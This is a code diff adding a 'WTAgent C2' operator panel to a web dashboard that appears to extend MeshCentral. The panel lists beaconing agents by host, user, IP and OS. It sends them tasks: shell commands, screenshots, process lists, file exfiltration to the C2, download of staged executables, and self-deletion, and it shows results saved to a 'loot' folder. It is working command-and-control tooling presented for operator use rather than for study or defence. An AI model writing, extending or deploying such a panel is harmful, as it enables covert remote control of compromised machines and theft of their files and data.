@@ -1069,6 +1069,8 @@
                 setupPlaybooks();
                 // Phase 9: 3D Globe
                 setupGlobe();
+                // Phase 12: WTAgent C2 Panel
+                setupWTAgentPanel();
                 // Finalize toolbar layout
                 setTimeout(addWtToolbarSeparators, 1200);
             }
@@ -5172,6 +5174,330 @@
                 })(step.cmd, cum2);
             });
         }
+    }
+    // ============================================================
+
+    // ============================================================
+    // Section 27: WTAgent C2 Panel
+    // Operator interface for wt_c2_server.js agents (separate from
+    // MeshCentral agents). Polls /op/agents via Bearer token auth.
+    // Config stored in localStorage: wt_agent_url, wt_agent_token
+    // ============================================================
+    var wtAgentPanelVisible = false;
+    var wtAgentPollTimer    = null;
+    var wtAgentSelected     = null;    // currently selected agent ID
+    var wtAgentResultTimer  = null;
+
+    function wtAgentApiBase() {
+        return (localStorage.getItem('wt_agent_url') || '').replace(/\/$/, '');
+    }
+    function wtAgentToken() {
+        return localStorage.getItem('wt_agent_token') || '';
+    }
+
+    function wtAgentFetch(path, opts) {
+        var base  = wtAgentApiBase();
+        var token = wtAgentToken();
+        if (!base || !token) return Promise.reject(new Error('WTAgent: no URL/token configured'));
+        var headers = Object.assign({ 'Authorization': 'Bearer ' + token }, (opts && opts.headers) || {});
+        return fetch(base + path, Object.assign({}, opts, { headers: headers }));
+    }
+
+    function injectWTAgentButton() {
+        var toolbar = document.getElementById('devListToolbarSpan');
+        if (!toolbar) { setTimeout(injectWTAgentButton, 800); return; }
+        if (document.getElementById('wtAgentBtn')) return;
+        var btn = document.createElement('span');
+        btn.id        = 'wtAgentBtn';
+        btn.className = 'wt-toolbar-btn';
+        btn.title     = 'WTAgent C2 — standalone beacon control';
+        btn.innerHTML = '&#9889; WTAGENT';
+        btn.onclick   = toggleWTAgentPanel;
+        toolbar.appendChild(btn);
+    }
+
+    function toggleWTAgentPanel() {
+        var panel = document.getElementById('wtAgentPanel');
+        if (!panel) { buildWTAgentPanel(); return; }
+        wtAgentPanelVisible = !wtAgentPanelVisible;
+        panel.style.display = wtAgentPanelVisible ? 'block' : 'none';
+        var btn = document.getElementById('wtAgentBtn');
+        if (btn) btn.classList.toggle('wt-toolbar-btn-active', wtAgentPanelVisible);
+        if (wtAgentPanelVisible) {
+            startWTAgentPoll();
+        } else {
+            stopWTAgentPoll();
+        }
+    }
+
+    function buildWTAgentPanel() {
+        var anchor = document.getElementById('devListToolbarSpan');
+        if (!anchor || !anchor.parentNode) return;
+
+        var panel = document.createElement('div');
+        panel.id        = 'wtAgentPanel';
+        panel.className = 'wt-agent-panel';
+        panel.innerHTML = [
+            '<div class="wt-agent-header">',
+            '  <span class="wt-agent-title">&#9889; WTAGENT C2</span>',
+            '  <span class="wt-agent-controls">',
+            '    <span class="wt-agent-status" id="wtAgentStatus">OFFLINE</span>',
+            '    <button class="wt-agent-cfg-btn" onclick="wtAgentShowConfig()" title="Configure API URL and token">&#9881; CFG</button>',
+            '    <button class="wt-agent-cfg-btn" onclick="wtAgentRefresh()">&#8635; REFRESH</button>',
+            '  </span>',
+            '</div>',
+            '<div id="wtAgentConfigBox" class="wt-agent-config-box" style="display:none">',
+            '  <label>C2 API URL (e.g. https://192.168.1.50:8443)</label>',
+            '  <input id="wtAgentUrlInput" class="wt-agent-input" type="text" placeholder="https://host:8443" />',
+            '  <label>Operator Token</label>',
+            '  <input id="wtAgentTokInput" class="wt-agent-input" type="password" placeholder="paste token from wt_op_token.txt" />',
+            '  <button class="wt-agent-save-btn" onclick="wtAgentSaveConfig()">SAVE</button>',
+            '</div>',
+            '<div id="wtAgentBody">',
+            '  <div class="wt-agent-table-wrap">',
+            '    <table class="wt-agent-table" id="wtAgentTable">',
+            '      <thead><tr>',
+            '        <th>ID</th><th>HOST</th><th>USER</th><th>IP</th><th>OS</th>',
+            '        <th>LAST SEEN</th><th>PENDING</th><th>ACTIONS</th>',
+            '      </tr></thead>',
+            '      <tbody id="wtAgentTbody"><tr><td colspan="8" class="wt-agent-empty">No agents connected</td></tr></tbody>',
+            '    </table>',
+            '  </div>',
+            '  <div id="wtAgentTaskArea" class="wt-agent-task-area" style="display:none">',
+            '    <div class="wt-agent-task-header">',
+            '      <span id="wtAgentTaskLabel">TASK → <span id="wtAgentTaskTarget"></span></span>',
+            '      <button class="wt-agent-cfg-btn" onclick="wtAgentCloseTask()">&#10005;</button>',
+            '    </div>',
+            '    <div class="wt-agent-task-row">',
+            '      <select id="wtAgentTaskType" class="wt-agent-select" onchange="wtAgentTaskTypeChange()">',
+            '        <option value="shell">shell</option>',
+            '        <option value="screenshot">screenshot</option>',
+            '        <option value="proclist">proclist</option>',
+            '        <option value="upload">upload (agent→C2)</option>',
+            '        <option value="download">download (C2→agent)</option>',
+            '        <option value="sleep">sleep</option>',
+            '        <option value="kill">kill</option>',
+            '        <option value="selfdel">selfdel</option>',
+            '      </select>',
+            '      <input id="wtAgentTaskArg" class="wt-agent-input wt-agent-task-arg" type="text" placeholder="command / filename / sleep-ms" />',
+            '      <button class="wt-agent-send-btn" onclick="wtAgentSendTask()">&#9654; SEND</button>',
+            '    </div>',
+            '    <div class="wt-agent-results-header">',
+            '      <span>RESULTS</span>',
+            '      <button class="wt-agent-cfg-btn" onclick="wtAgentLoadResults()">&#8635;</button>',
+            '    </div>',
+            '    <div id="wtAgentResults" class="wt-agent-results"></div>',
+            '  </div>',
+            '</div>'
+        ].join('\n');
+
+        anchor.parentNode.insertBefore(panel, anchor.nextSibling);
+
+        // Pre-fill config inputs if already saved
+        document.getElementById('wtAgentUrlInput').value = wtAgentApiBase();
+        document.getElementById('wtAgentTokInput').value = wtAgentToken();
+
+        wtAgentPanelVisible = true;
+        var btn = document.getElementById('wtAgentBtn');
+        if (btn) btn.classList.add('wt-toolbar-btn-active');
+
+        // Auto-show config if not configured yet
+        if (!wtAgentApiBase() || !wtAgentToken()) wtAgentShowConfig();
+
+        startWTAgentPoll();
+    }
+
+    function wtAgentShowConfig() {
+        var box = document.getElementById('wtAgentConfigBox');
+        if (!box) return;
+        box.style.display = box.style.display === 'none' ? 'block' : 'none';
+    }
+
+    function wtAgentSaveConfig() {
+        var u = (document.getElementById('wtAgentUrlInput').value || '').trim().replace(/\/$/, '');
+        var t = (document.getElementById('wtAgentTokInput').value || '').trim();
+        if (!u || !t) return;
+        localStorage.setItem('wt_agent_url', u);
+        localStorage.setItem('wt_agent_token', t);
+        var box = document.getElementById('wtAgentConfigBox');
+        if (box) box.style.display = 'none';
+        wtAgentRefresh();
+    }
+
+    function wtAgentRefresh() {
+        wtAgentFetch('/op/agents')
+            .then(function(r) {
+                if (!r.ok) throw new Error('HTTP ' + r.status);
+                return r.json();
+            })
+            .then(function(agents) {
+                wtAgentSetStatus('ONLINE', true);
+                renderWTAgentTable(agents);
+                if (wtAgentSelected) wtAgentLoadResults();
+            })
+            .catch(function(e) {
+                wtAgentSetStatus('OFFLINE', false);
+            });
+    }
+
+    function wtAgentSetStatus(label, online) {
+        var el = document.getElementById('wtAgentStatus');
+        if (!el) return;
+        el.textContent = label;
+        el.className = 'wt-agent-status ' + (online ? 'wt-agent-status-on' : 'wt-agent-status-off');
+    }
+
+    function renderWTAgentTable(agents) {
+        var tbody = document.getElementById('wtAgentTbody');
+        if (!tbody) return;
+        if (!agents || !agents.length) {
+            tbody.innerHTML = '<tr><td colspan="8" class="wt-agent-empty">No agents connected</td></tr>';
+            return;
+        }
+        var now = Date.now();
+        tbody.innerHTML = agents.map(function(a) {
+            var age    = Math.floor((now - a.lastSeen) / 1000);
+            var ageStr = age < 60 ? age + 's' : age < 3600 ? Math.floor(age/60) + 'm' : Math.floor(age/3600) + 'h';
+            var active = age < 30;
+            return [
+                '<tr class="wt-agent-row' + (a.id === wtAgentSelected ? ' wt-agent-row-sel' : '') + '">',
+                '  <td><span class="wt-beacon-id-badge">' + a.id.substring(0,8) + '</span></td>',
+                '  <td>' + esc(a.host) + '</td>',
+                '  <td>' + esc(a.user) + '</td>',
+                '  <td>' + esc(a.ip)   + '</td>',
+                '  <td>' + esc(a.os ? a.os.replace(/Windows /i,'Win').replace(/ \(.+\)/,'') : '?') + '</td>',
+                '  <td><span class="' + (active ? 'wt-beacon-active' : 'wt-beacon-idle') + '">' + ageStr + '</span></td>',
+                '  <td>' + (a.pendingTasks || 0) + '</td>',
+                '  <td><button class="wt-agent-task-btn" onclick="wtAgentOpenTask(\'' + a.id + '\')">TASK</button>',
+                '      <button class="wt-agent-kill-btn" onclick="wtAgentQuickKill(\'' + a.id + '\')">KILL</button></td>',
+                '</tr>'
+            ].join('');
+        }).join('');
+    }
+
+    function wtAgentOpenTask(agentId) {
+        wtAgentSelected = agentId;
+        var area = document.getElementById('wtAgentTaskArea');
+        if (!area) return;
+        area.style.display = 'block';
+        var lbl = document.getElementById('wtAgentTaskTarget');
+        if (lbl) lbl.textContent = agentId.substring(0,8);
+        document.getElementById('wtAgentTaskArg').value = '';
+        document.getElementById('wtAgentTaskType').value = 'shell';
+        wtAgentTaskTypeChange();
+        wtAgentLoadResults();
+        // Highlight row
+        document.querySelectorAll('.wt-agent-row').forEach(function(r) { r.classList.remove('wt-agent-row-sel'); });
+        var rows = document.querySelectorAll('.wt-agent-row');
+        rows.forEach(function(r) {
+            if (r.querySelector('.wt-beacon-id-badge') &&
+                r.querySelector('.wt-beacon-id-badge').textContent === agentId.substring(0,8))
+                r.classList.add('wt-agent-row-sel');
+        });
+    }
+
+    function wtAgentCloseTask() {
+        wtAgentSelected = null;
+        var area = document.getElementById('wtAgentTaskArea');
+        if (area) area.style.display = 'none';
+    }
+
+    function wtAgentTaskTypeChange() {
+        var type  = document.getElementById('wtAgentTaskType').value;
+        var input = document.getElementById('wtAgentTaskArg');
+        if (!input) return;
+        var noArg = ['screenshot','proclist','kill','selfdel'];
+        input.style.display   = noArg.indexOf(type) >= 0 ? 'none' : 'inline-block';
+        input.placeholder = type === 'shell'    ? 'e.g. whoami /all' :
+                            type === 'upload'   ? 'C:\\path\\to\\file.txt' :
+                            type === 'download' ? 'filename.exe (must be staged)' :
+                            type === 'sleep'    ? 'interval in ms, e.g. 10000' : '';
+    }
+
+    function wtAgentSendTask() {
+        if (!wtAgentSelected) return;
+        var type = document.getElementById('wtAgentTaskType').value;
+        var arg  = (document.getElementById('wtAgentTaskArg').value || '').trim();
+        var body = { type: type };
+        if (arg) body.arg = arg;
+        if (type === 'sleep' && arg) body.sleep = parseInt(arg, 10);
+        wtAgentFetch('/op/task/' + wtAgentSelected, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body)
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(r) {
+            if (r.ok) {
+                wtLogEvent('CMD', '[WTAGENT:' + wtAgentSelected.substring(0,8) + '] ' + type + (arg ? ' ' + arg : ''), null);
+                document.getElementById('wtAgentTaskArg').value = '';
+                setTimeout(wtAgentLoadResults, 500);
+            }
+        })
+        .catch(function() {});
+    }
+
+    function wtAgentQuickKill(agentId) {
+        if (!confirm('Kill agent ' + agentId.substring(0,8) + '?')) return;
+        wtAgentFetch('/op/task/' + agentId, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'kill' })
+        }).catch(function() {});
+    }
+
+    function wtAgentLoadResults() {
+        if (!wtAgentSelected) return;
+        wtAgentFetch('/op/results/' + wtAgentSelected)
+            .then(function(r) { return r.json(); })
+            .then(function(res) { renderWTAgentResults(res); })
+            .catch(function() {});
+    }
+
+    function renderWTAgentResults(results) {
+        var el = document.getElementById('wtAgentResults');
+        if (!el) return;
+        if (!results || !results.length) {
+            el.innerHTML = '<div class="wt-agent-no-results">No results yet</div>';
+            return;
+        }
+        el.innerHTML = results.slice(0, 30).map(function(r) {
+            var ts  = new Date(r.ts).toLocaleTimeString();
+            var out = (r.out || '').substring(0, 2000);
+            var isScreenshot = r.type === 'screenshot' || (out.indexOf('[saved to loot/') === 0);
+            return [
+                '<div class="wt-agent-result">',
+                '  <div class="wt-agent-result-hdr">',
+                '    <span class="wt-agent-result-id">[' + esc(r.task_id) + ']</span>',
+                '    <span class="wt-agent-result-type">' + esc(r.type) + '</span>',
+                '    <span class="wt-agent-result-ts">' + ts + '</span>',
+                '  </div>',
+                isScreenshot
+                    ? '<div class="wt-agent-result-out wt-agent-result-dim">' + esc(out) + '</div>'
+                    : '<pre class="wt-agent-result-out">' + esc(out || '(no output)') + '</pre>',
+                '</div>'
+            ].join('');
+        }).join('');
+    }
+
+    function startWTAgentPoll() {
+        stopWTAgentPoll();
+        wtAgentRefresh();
+        wtAgentPollTimer = setInterval(function() {
+            if (wtAgentPanelVisible) wtAgentRefresh();
+        }, 5000);
+    }
+
+    function stopWTAgentPoll() {
+        if (wtAgentPollTimer) { clearInterval(wtAgentPollTimer); wtAgentPollTimer = null; }
+    }
+
+    function esc(s) {
+        return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+    }
+
+    function setupWTAgentPanel() {
+        injectWTAgentButton();
     }
     // ============================================================
 
